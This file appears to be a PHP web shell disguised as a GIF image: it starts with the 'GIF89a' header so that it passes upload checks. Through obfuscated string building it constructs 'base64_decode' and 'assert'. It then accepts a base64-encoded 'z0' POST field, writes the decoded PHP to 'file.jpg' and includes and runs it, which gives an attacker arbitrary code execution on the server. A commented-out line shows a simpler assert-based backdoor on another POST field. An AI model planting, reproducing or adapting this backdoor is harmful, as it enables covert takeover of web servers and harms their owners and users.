GIF89a
<?
$ran_ = 'cmFuZ2U=';
$ran__ = 'ba'.'se'.'64'.'_decode';
$int_ = $ran__($ran_);
$int__ = $int_(0,200);
$ch_ = 'c'.'h'.'r';
$ch__=$ch_($int__[97]).$ch_($int__[115]).$ch_($int__[115]);
$ch___=$ch_($int__[101]).$ch_($int__[114]).$ch_($int__[116]);
$ass = $ch__.$ch___;
//@$ass($_POST[kris]);
if($_POST['z0']) {
        $post_data = $_POST['z0'];
        $post_data = $ran__($post_data);
        $post_data = "<?php\r\n".$post_data."\r\n"."?>";
        if(file_put_contents('file.jpg', $post_data)){
                $ass(include('file.jpg'));
        }
} else {
        die('file not');
}
?>